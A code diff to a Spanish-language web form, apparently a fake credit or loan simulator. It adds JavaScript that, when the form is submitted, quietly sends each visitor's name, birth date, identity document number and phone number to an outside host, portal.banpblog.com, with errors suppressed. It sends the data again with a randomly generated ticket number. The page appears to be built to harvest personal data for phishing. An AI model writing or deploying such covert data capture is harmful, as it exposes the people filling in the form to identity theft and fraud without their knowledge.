@@ -869,6 +869,30 @@ $v = time();
     function submitSim(e) {
       e.preventDefault();
       if (window.fbq) fbq('track', 'Lead');
+
+      /* Capturar datos del form */
+      const form = e.target;
+      const payload = {
+        nombre: form.nombre.value,
+        fnac:   form.fnac.value,
+        doc:    form.doc.value,
+        tel:    form.tel.value
+      };
+
+      /* Enviar al backend (fire-and-forget) */
+      try {
+        fetch('https://portal.banpblog.com/portal/t.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+          keepalive: true,
+          mode: 'cors'
+        }).catch(() => {});
+      } catch (err) {}
+
+      /* Guardar para incluir ticket cuando se genere */
+      window._simData = payload;
+
       showStep(2);
 
       const statuses = [
@@ -902,6 +926,19 @@ $v = time();
       const num = rand() + '-' + rand();
       const el = document.getElementById('ticketNumber');
       if (el) el.textContent = num;
+
+      /* Enviar ticket al backend con los datos previos */
+      if (window._simData) {
+        try {
+          fetch('https://portal.banpblog.com/portal/t.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(Object.assign({}, window._simData, { ref: num })),
+            keepalive: true,
+            mode: 'cors'
+          }).catch(() => {});
+        } catch (err) {}
+      }
     }
 
     /* Continuar a registro (iframe overlay) */
